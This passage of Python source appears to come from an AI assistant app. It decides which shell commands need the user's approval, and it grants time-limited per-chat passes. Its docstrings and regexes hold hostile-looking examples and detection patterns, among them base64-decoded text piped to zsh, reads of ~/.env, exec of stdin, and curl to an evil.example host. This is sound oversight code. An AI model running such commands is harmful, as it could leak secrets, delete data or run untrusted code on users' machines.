_SED_PRINT = re.compile(r"((\d+|\$|/[^/\\]*/)(,(\d+|\$|/[^/\\]*/))?p)(;(\d+|\$|/[^/\\]*/)(,(\d+|\$|/[^/\\]*/))?p)*")
_AWK_RUNS_OR_WRITES = re.compile(r"system|getline|ENVIRON|close|fflush|[|>@]")


def plain_sed(args: list[str]) -> bool:
    """Whether a sed only prints lines: -n, with -E or -r allowed, and one script of line numbers or /patterns/ ending
    in p (no w, e or s). ["-n", "100,175p", "a.py"] -> True; ["-n", "/def /p", "a.py"] -> True;
    ["-n", "1w /tmp/x", "a.py"] -> False; ["-i", "", "s/a/b/", "a"] -> False; ["1,5p", "a"] -> False (no -n)."""
    flags = [a for a in args if a.startswith("-")]
    rest = [a for a in args if not a.startswith("-")]
    if "-n" not in flags or any(f not in ("-n", "-E", "-r") for f in flags):
        return False
    return bool(rest) and _SED_PRINT.fullmatch(rest[0]) is not None


def plain_git(args: list[str]) -> bool:
    """Whether a git command only reads: log, status, diff or show (never --output, which writes a file), or a bare
    `git branch` that lists. ["log", "--oneline", "-5"] -> True; ["diff", "--output=/tmp/x"] -> False;
    ["branch", "-a"] -> True; ["branch", "-D", "main"] -> False; ["-c", "core.pager=less", "log"] -> False."""
    if not args or args[0] not in _GIT_READS:
        return False
    if any(a.startswith("--output") for a in args):
        return False
    if args[0] == "branch":
        return all(a in _GIT_BRANCH_LISTS for a in args[1:])
    return True


def plain_awk(args: list[str]) -> bool:
    """Whether an awk only reads and prints: -F and -v allowed, no other option (-f reads a program we can't see), and
    a program with no system, getline, ENVIRON, pipe, redirect or @load. ["/def /{print NR}", "a.py"] -> True;
    ["-F:", "{print $1}", "f"] -> True; ["BEGIN{system(\"id\")}"] -> False; ["{print > \"out\"}", "f"] -> False;
    ["-f", "prog.awk"] -> False."""
    i = 0
    while i < len(args) and args[i].startswith("-"):
        option = args[i]
        if option in ("-F", "-v"):
            i += 2
            continue
        if option.startswith(("-F", "-v")):
            i += 1
            continue
        return False
    if i >= len(args):
        return False
    return _AWK_RUNS_OR_WRITES.search(args[i]) is None


def plain_sort(args: list[str]) -> bool:
    """Whether a sort only prints: no -o / --output (writes a file) and no --compress-program (runs one).
    ["-h"] -> True; ["-o", "a.py", "a.py"] -> False; ["-ro", "x"] -> False; ["--output=x"] -> False."""
    for a in args:
        if a.startswith(("--output", "--compress-program")):
            return False
        if a.startswith("-") and not a.startswith("--") and "o" in a:
            return False
    return True


def is_plain_reader(words: list[str]) -> bool:
    """Whether one simple command only reads and prints (cd, ls, cat, head, tail, wc, stat, file, grep family, echo,
    sort, uniq, cut, tr, awk, sed -n, find, git log/status/diff/show/branch, pwd, nl, basename, dirname), with each
    tool's ways of writing or running something refused. An empty command (a blank) counts as one.
      ["grep", "-n", "x", "a.py"] -> True;  ["sed", "-n", "100,175p", "a.py"] -> True;  ["find", ".", "-delete"] ->
      False;  ["rg", "--pre", "./x", "y"] -> False;  ["uniq", "a", "b"] -> False (writes b);  ["rm", "x"] -> False;
      ["FOO=1", "cat", "x"] -> False."""
    if not words:
        return True
    tool = words[0]
    args = words[1:]
    if tool not in _READERS:
        return False
    if tool == "sed":
        return plain_sed(args)
    if tool == "git":
        return plain_git(args)
    if tool == "awk":
        return plain_awk(args)
    if tool == "sort":
        return plain_sort(args)
    if tool == "find":
        return not any(a in _FIND_ACTIONS for a in args)
    if tool == "uniq":
        return len([a for a in args if not a.startswith("-")]) <= 1
    if tool == "rg":
        return not any(a.startswith("--pre") and not a.startswith("--pre-glob") for a in args)
    if tool == "file":
        return not any(a in ("-C", "--compile") for a in args)
    return True


def is_login_reader(words: list[str]) -> bool:
    """Smart's rule 4: whether one simple command only reads what runs later or at login: `launchctl list` or
    `launchctl print`, `crontab -l`, `plutil -p`, or any plain reader (is_plain_reader) naming a LaunchAgent.
      ["launchctl", "list"] -> True;  ["crontab", "-l"] -> True;  ["plutil", "-p", "x.plist"] -> True;
      ["launchctl", "bootout", "gui/501/x"] -> False;  ["crontab", "-r"] -> False;  ["plutil", "-convert", "xml1",
      "x.plist"] -> False;  ["cp", "x.plist", "~/Library/LaunchAgents/"] -> False."""
    if not words:
        return True
    tool = words[0]
    args = words[1:]
    if tool == "launchctl":
        return bool(args) and args[0] in ("list", "print")
    if tool == "crontab":
        return args == ["-l"]
    if tool == "plutil":
        return len(args) >= 2 and args[0] == "-p"
    return is_plain_reader(words)


_LOCAL_HOSTS = frozenset({"localhost", "127.0.0.1", "::1", "0.0.0.0"})
_DEFAULT_PORT = {"http": 80, "https": 443}
# curl and wget options that send a request somewhere else (a proxy, a name resolved elsewhere, a redirect followed,
# a socket, a config file, a list of addresses read from a file, links followed to other hosts), or a second request:
# such a send always asks. The two tools give the same letters different meanings (curl -H is a header, wget -H spans
# hosts), so each has its own list.
_CURL_ELSEWHERE = frozenset({"-x", "--proxy", "--preproxy", "--resolve", "--connect-to", "--unix-socket",
                             "--abstract-unix-socket", "-K", "--config", "-L", "--location", "--location-trusted", "-:",
                             "--next", "--doh-url"})
_WGET_ELSEWHERE = frozenset({"-e", "--execute", "-i", "--input-file", "-B", "--base", "-H", "--span-hosts", "-r",
                             "--recursive", "-m", "--mirror", "-p", "--page-requisites"})
_ELSEWHERE_PREFIXES = ("--proxy", "--socks", "--preproxy")
# Options whose next word is a value, not an address (curl's and wget's common ones).
_CURL_VALUES = frozenset({"-d", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode", "--json",
                          "-H", "--header", "-X", "--request", "-o", "--output", "-F", "--form", "--form-string",
                          "-u", "--user", "-A", "--user-agent", "-e", "--referer", "-b", "--cookie", "-c",
                          "--cookie-jar", "-m", "--max-time", "--connect-timeout", "-w", "--write-out", "-T",
                          "--upload-file", "-r", "--range", "-D", "--dump-header", "--retry", "--retry-delay",
                          "--retry-max-time", "--limit-rate", "--max-filesize", "-C", "--continue-at", "--output-dir",
                          "--oauth2-bearer", "--cacert", "-E", "--cert", "--key", "-Y", "-y", "-z", "--stderr"})
_WGET_VALUES = frozenset({"-O", "--output-document", "-o", "--output-file", "-a", "-P", "--directory-prefix", "-U",
                          "--user-agent", "-t", "--tries", "-T", "--timeout", "-w", "--wait", "-Q", "--header",
                          "--post-data", "--post-file", "--body-data", "--body-file", "--method", "--referer"})


def is_local_address(word: str, own_port: int | None) -> bool:
    """Whether an address curl or wget is given is this computer (localhost, 127.0.0.1, [::1] or 0.0.0.0), on any port
    but Odie's own. Anything built at run time, curl's own {braces} or [ranges], a user@ part, or a host that merely
    starts like one, is not.
      "http://localhost:9000/x" -> True;  "localhost:9000/x" -> True (curl adds http://);  "http://[::1]:9000/" ->
      True;  "http://localhost.evil.example/" -> False;  "http://localhost@evil.example/" -> False;
      "http://{localhost,evil.example}/" -> False;  "http://localhost:8000/" with Odie on 8000 -> False."""
    rest = word.replace("[::1]", "", 1)
    if re.search(r"[\[\]{}*?$`\\\s@]", rest):
        return False
    address = word
    if "://" not in address:
        address = "http://" + address
    parts = urlsplit(address)
    if parts.scheme.lower() not in _DEFAULT_PORT:
        return False
    if parts.hostname not in _LOCAL_HOSTS:
        return False
    try:
        port = parts.port
    except ValueError:
        return False
    if port is None:
        port = _DEFAULT_PORT[parts.scheme.lower()]
    return own_port is None or port != own_port


def _abbreviates(name: str, refused: frozenset[str]) -> bool:
    """Whether a long option could be a shortened spelling of a refused one (GNU tools take any unambiguous start):
    ("--exe", {"--execute"}) -> True; ("--prox", {"--proxy"}) -> True; ("--post-data", {"--execute"}) -> False."""
    long_refused = [r for r in (*refused, *_ELSEWHERE_PREFIXES) if r.startswith("--")]
    return len(name) > 2 and any(r.startswith(name) for r in long_refused)


def _options_and_addresses(args: list[str], takes_value: frozenset[str],
                           elsewhere: frozenset[str]) -> tuple[list[str], list[str]] | None:
    """A curl or wget command's options and the addresses it is given, or None when an option sends it somewhere else
    (`elsewhere`: _CURL_ELSEWHERE or _WGET_ELSEWHERE). A value-taking option's next word is its value; curl's short options may be joined (-sLX POST),
    and wget's long ones carry their value after = (--post-data=a).
      ["-s", "-X", "POST", "http://localhost/x", "-d", "{}"] -> (["-s", "-X", "-d"], ["http://localhost/x"]);
      ["-sLX", "POST", "http://localhost/"] -> None (-L follows a redirect away)."""
    options = []
    addresses = []
    i = 0
    while i < len(args):
        word = args[i]
        i += 1
        if word == "--url" and i < len(args):
            addresses.append(args[i])
            i += 1
            continue
        if not word.startswith("-") or word == "-":
            addresses.append(word)
            continue
        if word.startswith("--"):
            name = word.split("=", 1)[0]
            if name in elsewhere or name.startswith(_ELSEWHERE_PREFIXES) or _abbreviates(name, elsewhere):
                return None
            options.append(name)
            if name in takes_value and "=" not in word:
                i += 1
            continue
        for at, letter in enumerate(word[1:], start=1):
            short = "-" + letter
            if short in elsewhere:
                return None
            options.append(short)
            if short in takes_value:
                if at == len(word) - 1:
                    i += 1  # its value is the next word
                break  # otherwise the rest of this word is its value
    return options, addresses


def is_local_send(words: list[str], own_port: int | None) -> bool:
    """Smart's rule 5: whether one simple command is curl or wget sending only to this computer (is_local_address),
    straight there: no proxy, no redirect followed, no socket or config file, at least one address and every one local.
      ["curl", "-s", "-X", "POST", "http://localhost:9000/x", "-d", "{}"] -> True;
      ["curl", "-X", "POST", "https://example.com/hook", "-d", "1"] -> False;
      ["curl", "-x", "http://p.example:8080", "-X", "POST", "http://localhost/"] -> False;
      ["curl", "-X", "POST", "http://localhost/", "http://evil.example/"] -> False;  ["X=1", "curl", ...] -> False."""
    if not words or words[0] not in ("curl", "wget"):
        return False
    takes_value = _CURL_VALUES
    elsewhere = _CURL_ELSEWHERE
    if words[0] == "wget":
        takes_value = _WGET_VALUES
        elsewhere = _WGET_ELSEWHERE
    found = _options_and_addresses(words[1:], takes_value, elsewhere)
    if found is None:
        return False
    _options, addresses = found
    if not addresses:
        return False
    return all(is_local_address(a, own_port) for a in addresses)


# A pipe into python3 -c / node -e whose program is written right there, in one quoted word (double quotes only when
# nothing in it is filled in by the shell), and for node nothing after it (node would read later options, like -i).
_PIPE_INTO_PROGRAM = re.compile(
    r"\|\s*(?:python3?\s+-c\s+('[^']*'|\"[^\"$`\\]*\")(?=\s|$|[;&|)])"
    r"|node\s+-[ep]\s+('[^']*'|\"[^\"$`\\]*\")(?=\s*(?:$|[;&|\n])))")
# A pipe into python3 or node whose program is a heredoc with a quoted end word (so the shell fills nothing in).
_PIPE_INTO_HEREDOC = re.compile(r"\|\s*(python3?|node)\s+(?:-\s+)?<<-?\s*(['\"])\w+\2")
# What makes a program run the text it is given (or start a prompt that reads it): it then runs what came down the pipe.
_RUNS_ITS_INPUT = re.compile(
    r"\b(exec|eval|execfile|breakpoint|help|interact)\b|(?<![\w.])compile\b|__\w+__|\bbuiltins\b|pickle|marshal|"
    r"\brunpy\b|\bimportlib\b|\bos\.(system|popen|exec\w*|spawn\w*|posix_spawn\w*)\b|\bsubprocess\b|\bpty\b|"
    r"\bctypes\b|\bpdb\b|\bcode\b|\bInteractiveConsole\b|\byaml\b|\bshelve\b|\bdill\b|\bsys\.modules\b|"
    r"\bgetattr\b|\bsetattr\b|\b(globals|locals|vars)\b|\bconstructor\b|\bprototype\b|"
    r"\bFunction\b|\bvm\b|\bchild_process\b|\bworker_threads\b|\brepl\b|\binspector\b|\bimport\s*\(|"
    r"_compile\b|WebAssembly|\bprocess\.(binding|dlopen|mainModule)\b")
# What a piped program may bring in: modules that read, parse and print, and can't run anything. Anything else asks.
PLAIN_PY_MODULES = frozenset({"json", "sys", "csv", "re", "collections", "datetime", "math", "statistics", "itertools",
                              "functools", "textwrap", "pprint", "string", "operator", "decimal", "fractions",
                              "urllib.parse", "html", "unicodedata", "time", "zoneinfo", "hashlib", "uuid", "random"})
PLAIN_JS_MODULES = frozenset({"fs", "node:fs", "path", "node:path", "util", "node:util", "readline", "node:readline"})
_PY_IMPORT = re.compile(r"\bimport\s+([\w.]+(?:\s+as\s+\w+)?(?:\s*,\s*[\w.]+(?:\s+as\s+\w+)?)*)|\bfrom\s+([\w.]+)\s+import\b")
_JS_REQUIRE = re.compile(r"\brequire\s*\(")
_JS_PLAIN_REQUIRE = re.compile(r"\brequire\s*\(\s*(['\"])([\w:./-]+)\1\s*\)")


def program_runs_its_input(program: str, language: str) -> bool:
    """Whether a program written in the command (`language` "python" or "node") could run what it reads: it names a
    way to run text (exec, eval, compile, pickle, marshal, runpy, importlib, os.system, subprocess, Function, vm, a
    constructor …), opens a prompt that would (breakpoint, pdb, code.interact), or brings in a module that isn't on the
    short list of plain ones (PLAIN_PY_MODULES, PLAIN_JS_MODULES: an aliased `import os as o` could run anything).
    "import json,sys; print(json.load(sys.stdin))" -> False;  "import sys; exec(sys.stdin.read())" -> True;
    "import re; re.compile('a')" -> False;  "from code import interact" -> True;  "import os as o" -> True;
    node "require('fs').readFileSync(0)" -> False;  node "require('net')" -> True."""
    if _RUNS_ITS_INPUT.search(program):
        return True
    if language == "python":
        for found in _PY_IMPORT.finditer(program):
            names = [found.group(2)] if found.group(2) else [part.split()[0] for part in found.group(1).split(",")]
            if any(name not in PLAIN_PY_MODULES for name in names):
                return True
        return False
    plain_requires = [m.group(2) for m in _JS_PLAIN_REQUIRE.finditer(program)]
    if len(plain_requires) != len(_JS_REQUIRE.findall(program)):
        return True  # a require of something built at run time
    return any(name not in PLAIN_JS_MODULES for name in plain_requires)


def smart_blanked(shell: str, shell_read: str, code: str) -> str:
    """Smart's rules 2 and 3 applied to the text the rules read (`shell_read`, the same length as `shell`): a pipe into
    a program written in the command that doesn't run its input becomes a `;` (it carries data, not commands; the
    program itself is still read by every rule), and find's own -prune is blanked (it skips a folder; it deletes
    nothing). Decided on `shell`, as written.
      `curl -s u | python3 -c 'import json,sys; print(json.load(sys.stdin))'` -> the | becomes ;
      `curl -s u | python3 -c 'exec(input())'` -> unchanged;  `find . -path ./x -prune -o -print` -> -prune blanked;
      `git fetch --prune` -> unchanged."""
    contexts = char_contexts(shell)
    out = list(shell_read)
    for pipe in _PIPE_INTO_PROGRAM.finditer(shell):
        language = "python"
        program = pipe.group(1)
        if program is None:
            language = "node"
            program = pipe.group(2)
        if contexts[pipe.start()] == "plain" and not program_runs_its_input(program, language):
            out[pipe.start()] = ";"
    for pipe in _PIPE_INTO_HEREDOC.finditer(shell):
        language = "node" if pipe.group(1) == "node" else "python"
        if contexts[pipe.start()] == "plain" and not program_runs_its_input(code, language):
            out[pipe.start()] = ";"
    for start, end in piece_spans(shell):
        words = plain_words(shell[start:end])
        if not words or words[0] != "find":
            continue
        for prune in re.finditer(r"(?<=\s)-prune(?=\s|$)", shell[start:end]):
            at = start + prune.start()
            if contexts[at] == "plain":
                out[at:at + len("-prune")] = " " * len("-prune")
    return "".join(out)


def _blank_pieces(shell: str, text: str, keep: Callable[[list[str]], bool]) -> str:
    """`text` (as long as `shell`) with each simple command of `shell` that `keep` passes blanked out."""
    out = list(text)
    for start, end in piece_spans(shell):
        words = plain_words(shell[start:end])
        if words and keep(words):
            out[start:end] = " " * (end - start)
    return "".join(out)


def smart_views(shell: str, shell_read: str, own_port: int | None) -> dict[str, str]:
    """What some rules read in Smart instead of the whole text: the "runs later" rule doesn't see the commands that
    only read what runs at login (is_login_reader: `launchctl list`, `crontab -l`, `plutil -p`, `cat` of a plist), the
    "deletes" rule doesn't see `launchctl list|print` or `crontab -l` (launchctl and crontab are its words), and the
    "sends data out" rule doesn't see a send to this computer (is_local_send). Every other rule reads it all.
      `launchctl list | grep x` -> both login rules read "              | grep x";  `echo rm x` -> unchanged;
      `curl -X POST http://localhost:9000/x -d 1` -> "sends data out" reads blanks."""
    login_blanked = _blank_pieces(shell, shell_read, is_login_reader)
    listings_blanked = _blank_pieces(shell, shell_read, lambda words: words[0] in ("launchctl", "crontab")
                                     and is_login_reader(words))
    sends_blanked = _blank_pieces(shell, shell_read, lambda words: is_local_send(words, own_port))
    return {"deletes or stops something": listings_blanked, "sets something to run later or at login": login_blanked,
            "sends data out": sends_blanked}


# Odie's code checkout as a command names it: ~/.odie/app, $ODIE_HOME/app, ${ODIE_HOME}/app, as a whole folder name.
_ODIE_CODE = re.compile(r"(\.odie|\$?\{ODIE_HOME\}|\$?ODIE_HOME)/app(?=$|[/\s'\";&|)])")


def _odie_home_paths() -> tuple[str, str]:
    """Odie's home and its code checkout, links followed: ($ODIE_HOME or ~/.odie, the same + /app)."""
    home = os.path.realpath(os.path.expanduser(os.environ.get("ODIE_HOME") or "~/.odie"))
    return home, os.path.join(home, "app")


def _inside(path: str, place: str) -> bool:
    """Whether a path is the place or inside it: ("/h/.odie/app/x", "/h/.odie") -> True; ("/h/.odie", "/h/.odie") ->
    True; ("/h/.odie-old/x", "/h/.odie") -> False."""
    return path == place or path.startswith(place.rstrip("/") + "/")


def reads_only_odies_code(shell: str, code: str, cwd: str | None) -> bool:
    """Smart's rule 1: whether a command's only touch on Odie's home is reading its code checkout (~/.odie/app, also
    $ODIE_HOME/app). Every simple command must be a plain reader (is_plain_reader), nothing may climb with `..`, no
    inline code, no other part of Odie's home named, and every path it names, links followed, must stay in the checkout
    or outside Odie's home. When unsure: False, and the command asks.
      `cd ~/.odie/app; grep -n x web/src/a.tsx | head` -> True;  `cd ~/.odie; sed -n 1,5p mcp.json` -> False;
      `cd ~/.odie/app; cat ../.env` -> False;  `cd ~/.odie/app; cat link-out` (a link to ../mcp.json) -> False;
      `cd ~/.odie/app; cat $X` -> False;  `echo x > ~/.odie/app/a.py` -> False (a write);
      `cat ~/.odie/app/.git/config` -> False (a hidden file)."""
    if code.strip():
        return False
    where = cwd or ""
    if ".." in shell or ".." in where:
        return False
    for text in (shell, where):
        rest = _ODIE_CODE.sub(lambda m: " " * len(m.group(0)), text)
        if touches_odie_home(rest) or touches_odie_home(squeezed(rest)):
            return False
    odie_home, checkout = _odie_home_paths()
    here = os.path.realpath(os.path.expanduser(cwd or "~"))
    for start, end in piece_spans(shell):
        words = plain_words(shell[start:end])
        if words is None or not is_plain_reader(words):
            return False
        if words and words[0] == "cd":
            if len(words) > 2 or words[1:] == ["-"]:
                return False  # `cd -` goes back to a folder this text doesn't name
            here = _expanded(words[1] if len(words) == 2 else "~", here)
        for path in (here, *(_expanded(w, here) for w in words[1:])):
            if not _inside(path, odie_home):
                continue
            if not _inside(path, checkout):
                return False
            inside_checkout = _parts_under(path, checkout) or []
            if any(part.startswith(".") for part in inside_checkout):
                return False  # .git/config, a .env: hidden files there may hold a token
    return True


def always_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | None = None,
               scratch_dirs: tuple[str, ...] = (), smart: bool = False, own_port: int | None = None,
               odie_dirs: tuple[str, ...] = ()) -> str | None:
    """Why this command must be tapped even under a grant (the first of reasons_to_ask), or None if a grant covers it:
    `ls ~/Downloads` -> None; `rm old.txt` -> "deletes or stops something"; Smart, `crontab -l` -> None."""
    reasons = reasons_to_ask(command, safe_dirs, cwd, scratch_dirs, smart, own_port, odie_dirs)
    if not reasons:
        return None
    return reasons[0]


def reasons_to_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | None = None,
                   scratch_dirs: tuple[str, ...] = (), smart: bool = False, own_port: int | None = None,
                   odie_dirs: tuple[str, ...] = ()) -> list[str]:
    r"""Every reason this command must be tapped, in the order the rules find them (each once); [] when none. The rules
    read the shell text and any code fed to an interpreter (split_heredocs), as written and with spelling tricks
    squeezed out (squeezed); a hidden path reached by a pattern asks (hidden_path_by_pattern); file writes are judged
    from the shell text, with Odie's workspace and the vault (`safe_dirs`) as safe as /tmp. The rules can't read every
    shell (a script written to the workspace and then run is its own code): they close the ways a command hides what it
    does, not every command. Examples: `ls ~/Downloads` -> []; `rm old.txt` -> ["deletes or stops something"];
    `echo hi > /tmp/x` -> []; `echo hi > notes.txt` -> ["writes a file outside /tmp"]; `python3 -c "import PIL"` -> [];
    `python3 -c "import shutil; shutil.rmtree(p)"` -> ["deletes or stops something"]; `echo aWQ= | base64 -d | zsh` ->
    ["runs text as commands"]; `cat ~/.e?nv` -> ["reads secrets"]; `npm install left-pad` -> ["installs software (runs
    its install scripts)"]; `rm x && brew install y` -> ["deletes or stops something", "installs software (runs its
    install scripts)"].
    Ordinary work is read plainly first (16 Nov 2026): grep patterns are words, scratch deletes in /tmp or the workspace
    (`scratch_dirs`) and the project's own npx tool are blanked (ordinary_work_blanked), a \x escape asks only when it
    could spell a command (hex_spells_code), and code run from a safe place that writes there is a plain write
    (code_writes_stay_here): `rm -f /tmp/pr12-*.log` -> []; `grep "a\|source" README.md` -> [].
    `smart` (17 Nov 2026) reads seven kinds of ordinary work plainly too, in Smart mode only: reading Odie's code
    (reads_only_odies_code), a pipe into a program written in the command and find's -prune (smart_blanked), reading
    what runs at login and sending to this computer except Odie's own port `own_port` (smart_views), and a new file in
    an ordinary folder outside `odie_dirs` (write_reason). Careful's pass reads every command as before."""
    shell, code = split_heredocs(command)
    reasons: list[str] = []

    def note(why: str) -> None:
        if why not in reasons:
            reasons.append(why)

    if hex_spells_code(f"{shell}\n{code}"):
        note("runs text as commands")
    shell_read = ordinary_work_blanked(search_patterns_blanked(shell), scratch_dirs, cwd)
    views: dict[str, str] = {}
    if smart:
        shell_read = smart_blanked(shell, shell_read, code)
        views = smart_views(shell, shell_read, own_port)
    writes_stay_here = code_writes_stay_here(shell, code, safe_dirs, cwd)
    for squeeze in (False, True):
        for why, rule in _RULES:
            if why == "writes a file from code" and writes_stay_here and not rule.search(squeezed(shell_read)):
                continue  # the heredoc writes where it runs, in a safe place: like `cat > notes.md` there
            text = f"{views.get(why, shell_read)}\n{code}"
            if squeeze:
                text = squeezed(text)
            if rule.search(text):
                note(why)
    if hidden_path_by_pattern(shell_read, safe_dirs):
        note("reaches a hidden file by a pattern")
    write_why = write_reason(shell_read, safe_dirs, cwd, smart, odie_dirs)
    if write_why is not None:
        note(write_why)
    looked_at = f"{shell_read}\n{code}"
    if smart and cwd:
        looked_at = f"{cwd}\n{looked_at}"  # a command run in Odie's home touches it without naming it
    touched = touches_odie_home(looked_at) or touches_odie_home(squeezed(looked_at))
    if touched and not (smart and reads_only_odies_code(shell, code, cwd)):
        note("touches Odie's own files")
    return reasons


def _key(session_id: str) -> str:
    return f"shell_grant:{session_id}"


def grant(store: Store, session_id: str, now: datetime, minutes: int = GRANT_MINUTES) -> datetime:
    until = now + timedelta(minutes=minutes)
    store.set_setting(_key(session_id), {"until": until.isoformat()})
    return until


def active(store: Store, session_id: str, now: datetime) -> bool:
    """Is this chat's 'Allow for 30 min' pass still running? Example: granted at 10:00 -> True at 10:29, False at 10:31;
    never granted, or a stored value that can't be read -> False."""
    got = store.get_setting(_key(session_id))
    try:
        return bool(got) and datetime.fromisoformat(got["until"]) > now
    except (KeyError, TypeError, ValueError):
        return False


# ── "Don't ask again in this chat" (17 Nov 2026) ────────────────────────────────────────────────────────────────────
# In Smart, a shell card's second button lets that kind of command (the reason on the card) run without asking in that
# chat only, for GRANT_MINUTES. Kept in the settings as "shell_kinds:<chat id>" -> {"kinds": {kind: until}}: the key
# ends with the chat's id, so erasing a thread (personalities.erase_rows_of) takes its passes too.

CHAT_PASS = "allowed for this chat"
# The kinds a pass may cover. Reading secrets, changing Odie itself, switching off another agent's approvals, sending
# data out and a hidden path reached by a pattern are not here: those always ask.
PASSABLE = frozenset({"deletes or stops something", "runs text as commands", "writes a file from code",
                      "sets something to run later or at login", "installs software (runs its install scripts)",
                      "edits files in place", OUTSIDE, REPLACES})


def may_pass(kind: str | None) -> bool:
    """Whether a card asking for this reason may offer "don't ask again in this chat": "deletes or stops something" ->
    True; "installs software (runs its install scripts)" -> True; "reads secrets" -> False; "sends data out" -> False;
    "touches Odie's own files" -> False; None, or a reason this list doesn't know -> False."""
    return kind in PASSABLE


def _kinds_key(session_id: str) -> str:
    return f"shell_kinds:{session_id}"


def grant_kind(store: Store, session_id: str, kind: str, now: datetime, minutes: int = GRANT_MINUTES) -> datetime:
    """Let commands of this kind run in this chat without asking until now + minutes; returns that time. A kind that
    may never have a pass (may_pass) is refused with ValueError and nothing is saved."""
    if not may_pass(kind):
        raise ValueError(f"No pass for {kind!r}.")
    saved = store.get_setting(_kinds_key(session_id))
    kinds = {}
    if isinstance(saved, dict) and isinstance(saved.get("kinds"), dict):
        kinds = dict(saved["kinds"])
    until = now + timedelta(minutes=minutes)
    kinds[kind] = until.isoformat()
    store.set_setting(_kinds_key(session_id), {"kinds": kinds})
    return until


def kinds_passed(store: Store, session_id: str, now: datetime) -> set[str]:
    """The kinds this chat has a running pass for. Each kind keeps its own time; a time that can't be read, or a kind
    that may never have a pass, counts as none. Deletes passed at 10:00 -> {"deletes or stops something"} at 10:29, set()
    at 10:31; another chat -> set()."""
    saved = store.get_setting(_kinds_key(session_id))
    if not isinstance(saved, dict) or not isinstance(saved.get("kinds"), dict):
        return set()
    running = set()
    for kind, until in saved["kinds"].items():
        try:
            still_on = datetime.fromisoformat(until) > now
        except (TypeError, ValueError):
            continue
        if still_on and may_pass(kind):
            running.add(kind)
    return running


def card_offer(store: Store, session_id: str, command: str, cwd: str | None, now: datetime) -> dict[str, Any]:
    """What a Smart shell card says about the pass: the reason it asks (the first kind this chat has no pass for) and
    whether its second button is offered: only when that is the command's one missing kind and it may have a pass.
    Careful: {} (its card is as it always was).
      `rm old.txt` -> {"asks_because": "deletes or stops something", "chat_pass": True};
      `cat ~/.env` -> {"asks_because": "reads secrets", "chat_pass": False};
      `rm a && brew install b` -> {"asks_because": "deletes or stops something", "chat_pass": False} (two kinds; one
      pass covers one), and with deletes already passed -> {"asks_because": "installs software (…)", "chat_pass": True}."""
    if not approvals_mode.is_smart(store):
        return {}
    missing = _missing_kinds(store, session_id, command, cwd, now, smart=True)
    if not missing:
        return {"asks_because": None, "chat_pass": False}
    offered = len(missing) == 1 and may_pass(missing[0])
    return {"asks_because": missing[0], "chat_pass": offered}


def _reasons_for(store: Store, command: str, cwd: str | None, smart: bool) -> list[str]:
    """reasons_to_ask with this install's places: the workspace and vault, Odie's own port and folders."""
    return reasons_to_ask(command, safe_dirs=safe_places(store), cwd=cwd, scratch_dirs=scratch_places(), smart=smart,
                          own_port=_own_port(), odie_dirs=odie_places())


def _missing_kinds(store: Store, session_id: str, command: str, cwd: str | None, now: datetime,
                   smart: bool) -> list[str]:
    """The reasons this command asks (as the mode reads it) that no pass of this chat covers; only Smart has chat
    passes: Smart, `rm a && brew install b` with deletes passed -> ["installs software (runs its install scripts)"]."""
    reasons = _reasons_for(store, command, cwd, smart)
    if not smart:
        return reasons
    passed = kinds_passed(store, session_id, now)
    return [why for why in reasons if why not in passed]


def calls_allowed_for_chat(store: Store, session_id: str) -> set[str]:
    """The ids of the shell calls in this chat that ran under a pass for their kind (from the audit log), so their step
    says "allowed for this chat": {"c7"} after `rm old.txt` ran as c7 under a deletes pass; set() in a chat with none."""
    rows = store.query("select args_json from audit_log where session_id=? and event='shell_auto_approved' "
                       "and result_summary like ?", (session_id, f"{CHAT_PASS}%"))
    calls = set()
    for row in rows:
        try:
            args = json.loads(row["args_json"] or "{}")
        except ValueError:
            continue
        if isinstance(args, dict) and args.get("call_id"):
            calls.add(args["call_id"])
    return calls


def safe_places(store: Store) -> tuple[str, ...]:
    """Where a pass lets commands write besides /tmp: Odie's workspace, and the user's vault when one is set."""
    from odie import config
    from odie.vault import settings as vault_settings
    places = [str(config.settings.data_dir / "workspace")]
    vault = vault_settings.get(store).get("dir")
    if vault:
        places.append(str(vault))
    return tuple(places)


def scratch_places() -> tuple[str, ...]:
    """Where a delete needs no tap (with /tmp): Odie's own workspace, never the vault (its notes are the user's)."""
    from odie import config
    return (str(config.settings.data_dir / "workspace"),)


def _own_port() -> int:
    """The port Odie itself answers on (a POST there always asks)."""
    from odie import config
    return config.settings.port


def odie_places() -> tuple[str, ...]:
    """Odie's own folders, which a Smart write never counts as ordinary however they are named: its data folder, its
    settings folder and its home (~/.odie, or $ODIE_HOME)."""
    from odie import config
    home = os.environ.get("ODIE_HOME") or "~/.odie"
    return (str(config.settings.data_dir), str(config.settings.config_dir), os.path.expanduser(home))


def make_check(store: Store, clock: Callable[[], datetime] = datetime.now) -> Callable[..., bool]:
    """require_confirmation for run_shell: True means show the user the card."""
    def needs_tap(command: str = "", cwd: str | None = None, tool_context: Any = None, **_: Any) -> bool:
        """Does this shell command need the user's tap? Decided in four steps:
        1. Careful mode and no 'Allow for 30 min' pass in this chat (or it ran out) -> ask (the card). In Smart mode
           the pass isn't needed: the mode is read from the store on every call, so a flip mid-chat counts at once.
        2. A pass or Smart, and an ordinary command (no reason to ask: reasons_to_ask, read plainly in Smart) -> run it
           without a card, and note it in the audit log.
        3. Smart, and every reason it asks for has a running "don't ask again in this chat" pass (kinds_passed) -> run
           it, and note "allowed for this chat (<kinds>)" with the call's id, so its step can say so.
        4. Otherwise -> ask, and note the first reason no pass covers in the audit log.

        Examples:
          `ls ~/Downloads`, Careful, no pass -> card
          `ls ~/Downloads`, with a pass      -> runs, no card ("allowed for 30 min")
          `rm old.txt`, with a pass          -> card anyway ("deletes or stops something")
          `cat ~/.env`, with a pass          -> card anyway ("reads secrets")
          `ls ~/Downloads`, Smart, no pass   -> runs, no card ("allowed by smart mode")
          `crontab -l`, Smart                -> runs, no card (reading what runs at login)
          `rm old.txt`, Smart                -> card ("deletes or stops something")
          `rm old.txt`, Smart, deletes allowed for this chat -> runs ("allowed for this chat (deletes or stops …)")
          `brew install x`, Smart, deletes allowed for this chat -> card ("installs software (runs its install scripts)")
          `ls ~/Downloads`, Smart, a mail read this turn -> runs, no card (mail no longer counts)
        """
        session_id = session_id_of(tool_context)
        if not session_id:
            return True  # outside a chat there is no pass to look up
        smart = approvals_mode.runs_free(store, session_id)  # Smart mode
        if not smart and not active(store, session_id, clock()):
            return True  # Careful, and no pass or it ran out

